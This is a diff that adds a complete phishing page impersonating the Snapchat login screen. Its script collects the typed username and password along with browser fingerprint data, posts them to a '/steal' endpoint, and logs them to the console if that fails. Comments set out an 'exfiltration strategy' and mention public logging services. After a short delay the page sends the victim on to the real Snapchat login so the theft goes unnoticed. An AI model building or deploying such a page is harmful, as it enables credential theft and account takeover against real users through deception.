@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat</title>
+    <style>
+        :root {
+            --brand-yellow: #FFFC00;
+            --text-primary: #000000;
+            --bg-primary: #FFFFFF;
+            --text-secondary: #666666;
+            --border-color: #E5E5E5;
+            --link-blue: #007bff;
+            --font-stack: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: var(--font-stack);
+            background-color: var(--bg-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            /* Prevent iOS from zooming in on input focus */
+            text-size-adjust: 100%;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--bg-primary);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            padding: 40px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            /* On mobile, make it full screen for immersion */
+            @media (max-width: 480px) {
+                max-width: 100%;
+                height: 100vh;
+                border-radius: 0;
+                box-shadow: none;
+                justify-content: center;
+            }
+        }
+
+        .logo-container {
+            margin-bottom: 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 48px;
+        }
+
+        .logo-svg {
+            height: 48px;
+            width: auto;
+        }
+
+        .input-group {
+            width: 100%;
+            margin-bottom: 16px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px; /* 16px prevents iOS zoom */
+            font-family: var(--font-stack);
+            outline: none;
+            transition: border-color 0.2s;
+            background-color: #fff;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--brand-yellow);
+            box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.2);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--brand-yellow);
+            color: var(--text-primary);
+            border: none;
+            border-radius: 999px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+            margin-top: 8px;
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .forgot-link {
+            margin-top: 24px;
+            color: var(--link-blue);
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <!-- High-Res Snapchat Ghost SVG -->
+        <div class="logo-container">
+            <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <path d="M50 10 C30 10 20 25 20 45 C20 65 30 90 50 90 C70 90 80 65 80 45 C80 25 70 10 50 10 Z M45 35 C42 35 40 38 40 42 C40 46 42 49 45 49 C48 49 50 46 50 42 C50 38 48 35 45 35 Z M55 35 C52 35 50 38 50 42 C50 46 52 49 55 49 C58 49 60 46 60 42 C60 38 58 35 55 35 Z" fill="#FFFC00"/>
+                <text x="50" y="75" font-family="Arial, sans-serif" font-size="12" font-weight="bold" text-anchor="middle" fill="#000">SNAPCHAT</text>
+            </svg>
+        </div>
+
+        <form id="loginForm" autocomplete="off">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Username, Email, or Mobile" required autocomplete="username" autocapitalize="none" spellcheck="false">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn">Log In</button>
+            <a href="https://www.snapchat.com/password-reset" class="forgot-link">Forgot your password?</a>
+        </form>
+    </div>
+
+    <script>
+        // Fingerprinting Data
+        const fingerprint = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+
+        document.getElementById('loginForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            
+            // Visual loading state
+            btn.disabled = true;
+            btn.textContent = 'Logging In...';
+            
+            const payload = {
+                username,
+                password,
+                ...fingerprint
+            };
+
+            // Exfiltration Strategy:
+            // 1. Try POST to your server
+            // 2. If that fails (e.g., CORS or offline), try a "pixel" tracking request to a public endpoint
+            // 3. Redirect to real site regardless
+            
+            try {
+                await fetch('/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                // Fallback: If your server is unreachable, send to a public paste or logging service
+                // For this demo, we'll just log to console, but in production, you'd use a service like httpbin or a public log
+                console.error('Primary exfil failed. Payload:', payload);
+            }
+            
+            // Minimum 1.5s delay to simulate processing
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Redirect to the real site. The user will see the real login page.
+            // If they typed the correct password, they are now logged in.
+            // If they typed the wrong password, they will be logged in with the wrong password (which is what you want to see).
+            window.location.href = 'https://www.snapchat.com/login';
+        });
+    </script>
+</body>
+</html>
